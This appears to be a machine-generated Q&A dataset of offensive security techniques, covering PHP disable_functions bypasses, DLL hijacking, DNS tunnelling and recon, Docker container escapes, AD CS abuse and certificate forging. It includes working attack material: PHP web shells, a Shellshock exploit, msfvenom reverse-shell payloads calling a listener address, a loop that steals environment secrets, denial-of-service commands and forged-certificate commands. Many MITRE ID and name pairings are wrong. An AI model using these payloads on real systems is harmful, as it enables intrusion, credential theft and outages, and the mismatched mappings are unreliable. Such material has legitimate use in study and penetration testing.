A: The `FuckFastGCI` tool can be used to try and bypass the `disable_functions` and `open_basedir` restrictions in PHP by loading a malicious PHP extension. To use the tool:1. Obtain the `FuckFastGCI` script from the GitHub repository: https://github.com/w181496/FuckFastcgi or the improved version at https://github.com/BorelEnzo/FuckFastcgi.2. Compile a malicious PHP extension that you want to load. You'll need to make sure the extension is compiled for the same PHP version used by the target server.3. Update the `PHP_ADMIN_VALUE` variable in the script to include the `extension_dir` and `extension` values for your malicious extension.4. Run the script, which will attempt to load the extension and execute arbitrary code on the server.Note that this technique may not always work, as the server configuration could prevent loading extensions from the `PHP_ADMIN_VALUE` variable. Additionally, you'll need to ensure the malicious extension is compatible with the target PHP version. MITRE References: MITRE ID is T1216, MITRE Name is: Signed Script Proxy Execution, and MITRE Tactics are: Execution.

## Q: How can you exploit the PHP-FPM remote code execution vulnerability (CVE-2019-11043)?
A: To exploit the PHP-FPM remote code execution vulnerability (CVE-2019-11043), you can use the `phuip-fpizdam` tool:1. Obtain the `phuip-fpizdam` tool from the GitHub repository: https://github.com/neex/phuip-fpizdam.2. Run the tool against a vulnerable PHP-FPM server. The tool will attempt to exploit the CVE-2019-11043 vulnerability to execute arbitrary code on the server.You can also test this vulnerability using the Vulhub Docker environment:https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043This vulnerability allows bypassing restrictions like `disable_functions`, so it's a powerful technique for executing code on the server despite such limitations. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: What is the exploit code to bypass disable_functions in PHP <= 5.2.9 on Windows?
A: The exploit code to bypass disable_functions in PHP <= 5.2.9 on Windows is as follows:

```php<?php//cmd.php/*    Abysssec Inc Public Advisory         Here is another safemod bypass vulnerability exist in php <= 5.2.9 on windows .    the problem comes from OS behavior - implement  and interfacing between php    and operation systems directory structure . the problem is php won't tell difference     between directory browsing in linux and windows this can lead attacker to ability     execute his / her commands on targert machie even in SafeMod On  (php.ini setting) .     =============================================================================    in linux when you want open a directory for example php directory you need    to go to /usr/bin/php and you can't use \usr\bin\php . but windows won't tell    diffence between slash and back slash it means there is no didffrence  between     c:\php and c:/php , and this is not vulnerability but itself but  because of this  simple     php implement "\" character can escape safemode using  function like excec .     here is a PoC for discussed vulnerability . just upload files on your target host and execute    your commands .     ==============================================================================    note : this vulnerabities is just for educational purpose and author will be not be responsible      for any damage using this vulnerabilty.     ==============================================================================    for more information visit Abysssec.com    feel free to contact me at admin [at] abysssec.com*/    $cmd = $_REQUEST['cmd'];    if ($cmd){    $batch = fopen ("cmd.bat","w");    fwrite($batch,"$cmd>abysssec.txt"."\r\n");    fwrite($batch,"exit");    fclose($batch);    exec("\start cmd.bat");    echo "<center>";    echo "<h1>Abysssec.com PHP <= 5.2.9 SafeMod Bypasser</h1>";    echo "<textarea rows=20 cols=60>";    require("abysssec.txt");    echo "</textarea>";    echo "</center>";    }?><html><body bgcolor=#000000 and text=#DO0000><center><form method=post><input type=text name=cmd ><input type=submit value=bypass></form></center></body></html>``` MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can the 'disable_functions' bypass be exploited in PHP using the Perl extension?
A: The PHP code snippet provided can be used to bypass the 'disable_functions' restriction by leveraging the Perl extension. It creates a new Perl object and uses the 'eval' method to execute system commands. This allows running arbitrary commands on the server, even when 'disable_functions' is set to prevent the execution of system functions. MITRE References: MITRE ID is T1548.002, MITRE Name is: Abuse Elevation Control Mechanism: Bypass User Account Control, and MITRE Tactics are: Privilege Escalation.

## Q: How can you bypass the disable_functions restriction in PHP?
A: You can bypass the disable_functions restriction in PHP by using `proc_open()` and a custom environment. The code example provided shows how to use `proc_open()` to execute the `id` command and write the output to a file, bypassing the disable_functions restriction by using a custom environment with the `LD_PRELOAD` variable set to a shared library (`a.so`). MITRE References: MITRE ID is T1546.006, MITRE Name is: Dynamic Linker Hijacking, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you bypass disable_functions in PHP using /proc/self/mem?
A: The provided PHP code demonstrates a way to bypass disable_functions by modifying the open function in the PHP binary's memory. It does this by:
1. Finding the location of the libc library and the addresses of the open and system functions within it.
2. Locating the address of the open function in the PHP binary's memory.
3. Overwriting the open function address with the address of the system function, allowing the system function to be executed even when disable_functions is set.
To run the code, you need a 64-bit Linux system with a kernel version of at least 2.98, PHP-CGI or PHP-FPM, and open_basedir not set or able to be bypassed. MITRE References: MITRE ID is T1546.004, MITRE Name is: Code Signing Bypass, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can the ionCube extension be exploited to bypass safe_mode and disable_functions protections in PHP 5.2.4?
A: The ionCube extension 6.5 contains a vulnerability that can be exploited to bypass safe_mode and disable_functions protections in PHP 5.2.4. The ioncube_read_file function can be used to retrieve sensitive information, such as source code, password files, etc., even when these functions are disabled. To exploit this, you can use the provided PHP code that leverages the ioncube_read_file function to read the boot.ini file, which would normally be protected by the disable_functions setting. MITRE References: MITRE ID is T1505, MITRE Name is: Server Software Component, and MITRE Tactics are: TA0003, TA0004.

## Q: What is the PHP code to execute a command via the CVE-2014-6271 (Shellshock) vulnerability?
A: The PHP code to execute a command via the CVE-2014-6271 (Shellshock) vulnerability is:

```php<?phpfunction shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283   if(strstr(readlink("/bin/sh"), "bash") != FALSE) {     $tmp = tempnam(".","data");     putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");     mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actually send any mail   }   else return "Not vuln (not bash)";   $output = @file_get_contents($tmp);   @unlink($tmp);   if($output != "") return $output;   else return "No output, or not vuln.";}echo shellshock($_REQUEST["cmd"]);?>``` MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: Execution.

## Q: How can you escalate privileges using DLL Hijacking?
A: **Requirements**:

* Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**. 
* Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions). MITRE References: MITRE ID is T1574.001, MITRE Name is: DLL Search Order Hijacking, and MITRE Tactics are: Persistence, Privilege Escalation, Defense Evasion.

## Q: How can you create and compile DLLs for DLL Hijacking?
A: **Dll Proxifying**:
Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

**Meterpreter**:

**Get rev shell (x64):**
```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Get a meterpreter (x86):**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Create a user (x86 I didn't see a x64 version):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

**Your own**:
Note that in several cases the Dll that you compile must **export several functions** that are going to be loaded by the victim process, if these functions doesn't exist the **binary won't be able to load** them and the **exploit will fail**.

```c// Tested in Win10// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared#include <windows.h>BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){    switch(dwReason){        case DLL_PROCESS_ATTACH:            system("whoami > C:\\users\\username\\whoami.txt");            WinExec("calc.exe", 0); //This doesn't accept redirections like system            break;        case DLL_PROCESS_DETACH:            break;        case DLL_THREAD_ATTACH:            break;        case DLL_THREAD_DETACH:            break;    }    return TRUE;}``` MITRE References: MITRE ID is T1574.001, MITRE Name is: DLL Search Order Hijacking, and MITRE Tactics are: Persistence, Privilege Escalation, Defense Evasion.

## Q: How can dmitry be used to gather information about a target website or domain?
A: Dmitry (version 1.3a-2) is a powerful information gathering tool that can be used to gather various types of information about a target website or domain, including subdomains, email addresses, and open ports. To use dmitry, you can run the following command:

```root@kali:~# dmitry -winsepo output.txt example.com```

This command will perform a whois lookup on the domain name (-w), a whois lookup on the IP address (-i), retrieve Netcraft information (-n), search for subdomains (-s), search for email addresses (-e), and perform a TCP port scan (-p). The output will be saved to a file named 'output.txt' (-o). This information can be useful for pentesting or CTF events. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Reconnaissance.

## Q: How can dns2tcp be used in a penetration testing engagement to bypass network restrictions and establish a covert communication channel?
A: dns2tcp can be used to establish a covert communication channel by tunneling TCP traffic over DNS requests. This can be useful for bypassing network restrictions that block direct IP connections. For example, you can use dns2tcpc on a client machine to connect to a dns2tcpd server running on a remote system, allowing you to access resources on the remote network through the tunnel. Version 0.5.2 of dns2tcp is used in this example. MITRE References: MITRE ID is T1572, MITRE Name is: Protocol Tunneling, and MITRE Tactics are: Command and Control.

## Q: How can dns2tcp be leveraged in a post-exploitation scenario to maintain persistence and covert access to a compromised system?
A: In a post-exploitation scenario, dns2tcp can be used to establish a persistent, covert communication channel to a compromised system. By running the dns2tcpd server on the attacker's system and configuring the dns2tcpc client on the target, you can tunnel traffic over the DNS protocol to maintain access, even if the direct network connection is blocked or monitored. This allows you to continue executing commands and transferring data without drawing attention to the malicious activity. Version 0.5.2 of dns2tcp is used in this example. MITRE References: MITRE ID is T1572, MITRE Name is: Protocol Tunneling, and MITRE Tactics are: Persistence, Command and Control.

## Q: How can the dnscat2 client be used to create a reverse shell on a compromised system?
A: The dnscat2 client can be used to create a reverse shell by running it with the --exec argument to execute a shell process and connect it to the dnscat2 server. For example, 'dnscat --exec '/bin/bash'' will create a reverse shell that the attacker can interact with through the dnscat2 server. This allows the attacker to execute commands and interact with the compromised system. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution, Command and Control.

## Q: How can you extract exfiltrated data from a DNSCat pcap file?
A: If you have a pcap file with data being exfiltrated by DNSCat (without using encryption), you can find the exfiltrated content. You only need to know that the first 9 bytes are not real data but are related to the C&C communication. You can use the following Python script to extract the data:

```pythonfrom scapy.all import rdpcap, DNSQR, DNSRRimport struct f = ""last = ""for p in rdpcap('ch21.pcap'):    if p.haslayer(DNSQR) and not p.haslayer(DNSRR):        qry = p[DNSQR].qname.replace(".jz-n-bs.local.","").strip().split(".")        qry = ''.join(_.decode('hex') for _ in qry)[9:]        if last != qry:            print(qry)            f += qry        last = qry#print(f)```There is also a script that works with Python3: https://github.com/josemlwdf/DNScat-DecoderYou can run it with the following command:```python3 dnscat_decoder.py sample.pcap bad_domain``` MITRE References: MITRE ID is T1071.001, MITRE Name is: Application Layer Protocol: Web Protocols, and MITRE Tactics are: Command and Control.

## Q: How can dnsgen be used to generate wordlists for password cracking or brute-force attacks?
A: dnsgen can generate lists of potential passwords or usernames based on a provided domain name. For example, running `dnsgen example.com -l 5 -w /path/to/wordlist.txt` will generate a list of potential passwords like `example123`, `example_admin`, `admin_example`, etc. This list could be used in a password cracking or brute-force attack targeting a domain's user accounts. Version 1.0.4 was used for this example. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can dnsrecon be used to perform a brute-force attack on subdomains of a domain?
A: To perform a brute-force attack on subdomains of a domain using dnsrecon, you can use the following command:

```dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t brt```

This command will use the wordlist `/usr/share/wordlists/dnsmap.txt` to brute-force subdomains of the domain `example.com`. The `-t brt` flag specifies the brute-force enumeration type.

**MITRE ATT&CK Mapping:**
- **MITRE ID**: T1083
- **MITRE Name**: File and Directory Discovery
- **MITRE Tactics**: Discovery MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: How can we use dnsx to perform DNS enumeration and active reconnaissance on a target domain?
A: To perform DNS enumeration and active reconnaissance using dnsx version 1.1.4, we can use the following commands:1. Resolve A, AAAA, CNAME, and TXT records for a list of subdomains/hosts:   dnsx -l subdomains.txt -a -aaaa -cname -txt2. Brute-force subdomains using a wordlist:   dnsx -d example.com -w subdomains.txt -a -aaaa -cname -txt3. Discover DNS server information and perform zone transfer (AXFR) attacks:   dnsx -d example.com -ns -axfr4. Filter results by DNS response code to identify valid/invalid domains:   dnsx -l subdomains.txt -rc noerror,servfail,refusedThese commands can help map out the target's DNS infrastructure, identify subdomains, and discover potentially vulnerable services or information disclosure. MITRE References: MITRE ID is T1590, MITRE Name is: Gather Victim Host Information, and MITRE Tactics are: Reconnaissance.

## Q: How can dnsx be used to detect and bypass DNS wildcard subdomains?
A: To detect and bypass DNS wildcard subdomains using dnsx version 1.1.4, we can use the following commands:1. Detect the presence of a wildcard subdomain:   dnsx -wd example.com -json   This command will perform a wildcard detection check on the 'example.com' domain and output the results in JSON format.2. Bypass the wildcard subdomain:   dnsx -d example.com -w subdomains.txt -wd example.com -json   This command will brute-force subdomains of 'example.com' while using the 'example.com' domain for wildcard filtering. This helps to identify valid subdomains that are not part of the wildcard response.The '-wd' (wildcard-domain) flag is used to specify the domain for which the wildcard filtering should be applied. This allows dnsx to handle the wildcard response in an automated way and focus on finding valid subdomains. MITRE References: MITRE ID is T1583.001, MITRE Name is: Gather Victim Host Information: Gather Victim Identity Information, and MITRE Tactics are: Reconnaissance.

## Q: How can dnsx be used to perform DNS cache snooping and enumerate other DNS servers?
A: To perform DNS cache snooping and enumerate other DNS servers using dnsx version 1.1.4, we can use the following commands:1. Perform DNS cache snooping:   dnsx -d example.com -ptr -ro   This command will query the PTR (Reverse DNS) records for the 'example.com' domain. By analyzing the responses, we can identify any cached DNS information that may be exposed.2. Enumerate DNS servers:   dnsx -d example.com -ns -ro   This command will query the NS (Name Server) records for the 'example.com' domain. The results can be used to identify the DNS servers authoritative for the target domain, which can be further investigated for potential misconfigurations or vulnerabilities.The '-ro' (response-only) flag is used to display only the DNS response, without any additional output. This can make it easier to analyze the results and extract relevant information. MITRE References: MITRE ID is T1590.004, MITRE Name is: Gather Victim Host Information: Gather DNS Information, and MITRE Tactics are: Reconnaissance.

## Q: How can you exploit a misconfigured DNS server to obtain a list of subdomains?
A: To exploit a misconfigured DNS server and perform a DNS zone transfer attack, you can follow these steps:

1. Determine the DNS servers for the target domain using the 'host' command:
```
host -t ns wikipedia.com
```

2. Attempt a zone transfer from one of the identified DNS servers:
```
host -l wikipedia.com ns1.wikipedia.com
```

If the zone transfer is successful, you will receive a complete list of subdomains for the target domain. Tools like dnsrecon and dnsenum can also be used to automate this process. MITRE References: MITRE ID is T1048, MITRE Name is: DNS Zone Transfer, and MITRE Tactics are: Discovery.

## Q: How can you automatically enumerate a container and try to escape from it?
A: You can use tools like:

- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): It can also **enumerate containers**
- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): This tool is pretty **useful to enumerate the container you are into even try to escape automatically**
- [**amicontained**](https://github.com/genuinetools/amicontained): Useful tool to get the privileges the container has in order to find ways to escape from it
- [**deepce**](https://github.com/stealthcopter/deepce): Tool to enumerate and escape from containers
- [**grype**](https://github.com/anchore/grype): Get the CVEs contained in the software installed in the image MITRE References: MITRE ID is T1615, MITRE Name is: Container and Resource Discovery, and MITRE Tactics are: Discovery.

## Q: How can you try to escape from a privileged container?
A: A privileged container can be created with the flag `--privileged` or disabling specific defenses:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

The `--privileged` flag significantly lowers container security, offering **unrestricted device access** and bypassing **several protections**.

You can try to **access the host's disk** or try to **escape abusing release_agent or other escapes**. Test it by running:

```
docker run --rm -it --privileged ubuntu bash
``` MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Privilege Escalation, Execution.

## Q: How can you try to escape from a container by abusing its capabilities?
A: You should check the capabilities of the container, if it has any of the following ones, you might be able to scape from it:

`**CAP_SYS_ADMIN**`*,* `**CAP_SYS_PTRACE**`, `**CAP_SYS_MODULE**`, `**DAC_READ_SEARCH**`, `**DAC_OVERRIDE, CAP_SYS_RAWIO**`**,** `**CAP_SYSLOG**`**,** `**CAP_NET_RAW**`**,** `**CAP_NET_ADMIN**`

You can check currently container capabilities using **previously mentioned automatic tools** or:

```
capsh --print
```

You can learn more about linux capabilities and how to abuse them to escape/escalate privileges in the [Linux Capabilities page](/linux-hardening/privilege-escalation/linux-capabilities). MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Privilege Escalation.

## Q: How can you try to escape from a container by abusing the release_agent functionality?
A: The **release_agent** functionality can be abused to escape from a container.

For example, you can try the following PoCs:

[release_agent exploit - Relative Paths to PIDs](/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/release_agent-exploit-relative-paths-to-pids)

[release_agent exploit - Relative Paths to PIDs](/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/release_agent-exploit-relative-paths-to-pids)

These exploits allow you to execute a payload on the host by abusing the release_agent functionality. MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Privilege Escalation, Execution.

## Q: How can you try to escape from a container by abusing sensitive mounts?
A: There are several files that might be mounted that give **information about the underlaying host**. Some of them may even indicate **something to be executed by the host when something happens** (which will allow a attacker to escape from the container).

The abuse of these files may allow that:

* release_agent (already covered before)
* [binfmt_misc](/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/sensitive-mounts#proc-sys-fs-binfmt_misc)
* [core_pattern](/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/sensitive-mounts#proc-sys-kernel-core_pattern)
* [uevent_helper](/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/sensitive-mounts#sys-kernel-uevent_helper)
* [modprobe](/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/sensitive-mounts#proc-sys-kernel-modprobe)

You can find **other sensitive files** to check for in the [Sensitive Mounts page](/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/sensitive-mounts). MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Privilege Escalation, Execution.

## Q: How can you try to escape from a container by abusing arbitrary mounts?
A: In several occasions you will find that the **container has some volume mounted from the host**. If this volume wasn't correctly configured you might be able to **access/modify sensitive data**: Read secrets, change ssh authorized_keys...

You can test this by running:

```
docker run --rm -it -v /:/host ubuntu bash
``` MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Privilege Escalation.

## Q: How can you try to escalate privileges inside a container by abusing the hostPID namespace?
A: If you can access the processes of the host you are going to be able to access a lot of sensitive information stored in those processes. You can test this by running:

```
docker run --rm -it --pid=host ubuntu bash
```

For example, you will be able to list the processes using something like `ps auxn` and search for sensitive details in the commands.

Then, as you can **access each process of the host in /proc/ you can just steal their env secrets** running:

```
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
```

You can also **access other processes file descriptors and read their open files**.

If you somehow have privileged **access over a process outside of the container**, you could run something like `nsenter --target <pid> --all` or `nsenter --target <pid> --mount --net --pid --cgroup` to **run a shell with the same ns restrictions** (hopefully none) **as that process.** MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Privilege Escalation.

## Q: How can you try to escalate privileges inside a container by abusing the hostNetwork namespace?
A: If a container was configured with the Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), that container's network stack is not isolated from the Docker host (the container shares the host's networking namespace), and the container does not get its own IP-address allocated. In other words, the **container binds all services directly to the host's IP**. Furthermore the container can **intercept ALL network traffic that the host** is sending and receiving on shared interface `tcpdump -i eth0`.

This can be used to **sniff and even spoof traffic** between host and metadata instance. MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: How can you try to escalate privileges inside a container by abusing the hostIPC namespace?
A: With `hostIPC=true`, you gain access to the host's inter-process communication (IPC) resources, such as **shared memory** in `/dev/shm`. This allows reading/writing where the same IPC resources are used by other host or pod processes. You can use `ipcs` to inspect these IPC mechanisms further.

For example, you can:

* **Inspect /dev/shm** - Look for any files in this shared memory location: `ls -la /dev/shm`
* **Inspect existing IPC facilities** â€“ You can check to see if any IPC facilities are being used with `/usr/bin/ipcs`. Check it with: `ipcs -a` MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Privilege Escalation.

## Q: How can you try to escape from a container by abusing a user namespace symlink?
A: The second technique explained in the post <https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/> indicates how you can abuse bind mounts with user namespaces, to affect files inside the host (in that specific case, delete files). MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Privilege Escalation.

## Q: How can you try to escape from a container by abusing the Runc vulnerability (CVE-2019-5736)?
A: In case you can execute `docker exec` as root (probably with sudo), you try to escalate privileges escaping from a container abusing CVE-2019-5736 (exploit [here](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). This technique will basically **overwrite** the ***/bin/sh*** binary of the **host** **from a container**, so anyone executing docker exec may trigger the payload.

Change the payload accordingly and build the main.go with `go build main.go`. The resulting binary should be placed in the docker container for execution.
Upon execution, as soon as it displays `[+] Overwritten /bin/sh successfully` you need to execute the following from the host machine:

`docker exec -it <container-name> /bin/sh`

This will trigger the payload which is present in the main.go file. MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Privilege Escalation, Lateral Movement.

## Q: What is the Docker custom escape surface and how can you try to abuse it?
A: The Docker custom escape surface includes the following:* **Namespaces:** The process should be **completely separated from other processes** via namespaces, so we cannot escape interacting with other procs due to namespaces (by default cannot communicate via IPCs, unix sockets, network svcs, D-Bus, `/proc` of other procs).* **Root user**: By default the user running the process is the root user (however its privileges are limited).* **Capabilities**: Docker leaves certain capabilities enabled that could be abused.* **Syscalls**: There are certain syscalls that the **root user won't be able to call** (because of lacking capabilities + Seccomp). The other syscalls could be used to try to escape.You can try to find functionalities where you can **indicate the path of a script to be executed by a host process (helper)** if something happens, and have **enough capabilities and disabled protections** to be able to abuse that functionality. This usually requires the container to be in privileged mode. MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Privilege Escalation, Execution.

## Q: How can you find credentials or sensitive information in the memory of a Docker container running on the host?
A: Note that when you run a docker container inside a host **you can see the processes running on the container from the host** just running `ps -ef`

Therefore (as root) you can **dump the memory of the processes** from the host and search for **credentials** just [**like in the following example**](/linux-hardening/privilege-escalation#process-memory). MITRE References: MITRE ID is T1539, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: TA0006.

## Q: How can you exploit cgroups to escape the Docker container and execute arbitrary commands on the host?
A: The proof of concept (PoC) demonstrates a method to exploit cgroups by creating a `release_agent` file and triggering its invocation to execute arbitrary commands on the container host. The steps involved are:1. Prepare the Environment:   - Create a directory `/tmp/cgrp` to serve as a mount point for the cgroup.   - Mount the RDMA cgroup controller to this directory. Alternatively, use the `memory` cgroup controller.   - Create a child cgroup named "x" within the mounted cgroup directory.   - Enable notifications for the "x" cgroup by writing 1 to its `notify_on_release` file.2. Configure the Release Agent:   - Obtain the path of the container on the host from the `/etc/mtab` file.   - Configure the `release_agent` file of the cgroup to execute a script named `/cmd` located at the acquired host path.3. Create and Configure the `/cmd` Script:   - Create the `/cmd` script inside the container and configure it to execute `ps aux`, redirecting the output to a file named `/output` in the container.4. Trigger the Attack:   - Initiate a process within the "x" child cgroup and immediately terminate it.   - This triggers the `release_agent` (the `/cmd` script), which executes `ps aux` on the host and writes the output to `/output` within the container. MITRE References: MITRE ID is T1222, MITRE Name is: Exploit Executable File Permissions, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you perform a CPU Denial of Service (DoS) attack from a Docker container?
A: You can perform a CPU DoS attack from a Docker container using the following commands:

```# Using stress-ngsudo apt-get install -y stress-ng && stress-ng --vm 1 --vm-bytes 1G --verify -t 5m# Using a while loopdocker run -d --name malicious-container -c 512 busybox sh -c 'while true; do :; done'```These commands will either use the `stress-ng` tool or a simple `while` loop to consume all available CPU resources on the host, potentially causing a Denial of Service. MITRE References: MITRE ID is T1499, MITRE Name is: Endpoint Denial of Service, and MITRE Tactics are: TA0025.

## Q: How can you perform a Bandwidth Denial of Service (DoS) attack from a Docker container?
A: You can perform a Bandwidth DoS attack from a Docker container using the following command:

```nc -lvp 4444 >/dev/null & while true; do cat /dev/urandom | nc <target IP> 4444; done```This command will continuously send random data from the container to the target IP address, potentially consuming all available bandwidth and causing a Denial of Service. MITRE References: MITRE ID is T1499, MITRE Name is: Endpoint Denial of Service, and MITRE Tactics are: TA0025.

## Q: How can you exploit the ESC2 vulnerability in AD CS?
A: The ESC2 vulnerability in AD CS allows a low-privileged user to obtain a certificate with the "Any Purpose" extended key usage (EKU) or no EKU, enabling the certificate to be used for a wide range of purposes, including client authentication, server authentication, and code signing. This can be exploited by requesting a certificate using a vulnerable template. MITRE References: MITRE ID is T1558.003, MITRE Name is: Steal or Forge Kerberos Tickets: Kerberoasting, and MITRE Tactics are: PrivilegeEscalation, Persistence.

## Q: How can you exploit the ESC4 vulnerability in AD CS?
A: ESC4 is a vulnerability in AD CS where a user has write privileges over a certificate template. This can be abused to overwrite the configuration of the certificate template to make it vulnerable to ESC1, allowing the user to obtain certificates to impersonate other users, including domain administrators. MITRE References: MITRE ID is T1098.002, MITRE Name is: Account Manipulation: Exchange Email Delegation, and MITRE Tactics are: PrivilegeEscalation, Persistence.

## Q: How can you exploit the ESC6 vulnerability in AD CS?
A: ESC6 is a vulnerability in AD CS where the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is enabled, allowing the inclusion of user-defined values in the subject alternative name for any request, including those constructed from Active Directory. This can be exploited to enroll through any template set up for domain authentication and obtain a certificate that can be used to authenticate as any domain principal. MITRE References: MITRE ID is T1558.003, MITRE Name is: Steal or Forge Kerberos Tickets: Kerberoasting, and MITRE Tactics are: PrivilegeEscalation, Persistence.

## Q: How can you exploit the ESC8 vulnerability in AD CS?
A: ESC8 is a vulnerability in AD CS where the web enrollment endpoint or other HTTP-based enrollment methods are vulnerable to NTLM relay attacks, allowing an attacker to impersonate any AD account that authenticates via inbound NTLM and request a client authentication certificate using the User or Machine certificate templates. MITRE References: MITRE ID is T1208, MITRE Name is: Kerberoasting, and MITRE Tactics are: PrivilegeEscalation, Persistence.

## Q: How can you exploit the ESC10 vulnerability in AD CS?
A: ESC10 is a vulnerability in AD CS where the default settings for `CertificateMappingMethods` and `StrongCertificateBindingEnforcement` allow for weaker certificate mapping, enabling an attacker with `GenericWrite` permissions over another account to obtain a certificate that can be used to authenticate as that account, even if it lacks a `userPrincipalName`. MITRE References: MITRE ID is T1558.003, MITRE Name is: Steal or Forge Kerberos Tickets: Kerberoasting, and MITRE Tactics are: PrivilegeEscalation, Persistence.

## Q: How can you extract the private key of a CA certificate?
A: To extract the private key of this certificate, the `certsrv.msc` tool on the CA server is the supported method via the built-in GUI. Nonetheless, this certificate does not differ from others stored within the system; thus, methods such as the [THEFT2 technique](/windows-hardening/active-directory-methodology/ad-certificates/certificate-theft#user-certificate-theft-via-dpapi-theft2) can be applied for extraction.

The certificate and private key can also be obtained using Certipy with the following command:

```
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
``` MITRE References: MITRE ID is T1606.002, MITRE Name is: Forge Web Certificates, and MITRE Tactics are: TA0005, Defense Evasion.

## Q: How can you use ForgeCert or Certipy to generate valid certificates using a stolen CA certificate?
A: Upon acquiring the CA certificate and its private key in `.pfx` format, tools like [ForgeCert](https://github.com/GhostPack/ForgeCert) can be utilized to generate valid certificates:

```# Generating a new certificate with ForgeCertForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!# Generating a new certificate with certipycertipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'# Authenticating using the new certificate with RubeusRubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!# Authenticating using the new certificate with certipycertipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128``` MITRE References: MITRE ID is T1606.002, MITRE Name is: Forge Web Certificates, and MITRE Tactics are: TA0005, Defense Evasion.

## Q: How can you exploit a subdomain takeover vulnerability?
A: Subdomain takeover is essentially DNS spoofing for a specific domain across the internet, allowing attackers to set A records for a domain, leading browsers to display content from the attacker's server. This transparency in browsers makes domains prone to phishing. Attackers may employ typosquatting or Doppelganger domains for this purpose. Especially vulnerable are domains where the URL in a phishing email appears legitimate, deceiving users and evading spam filters due to the domain's inherent trust.

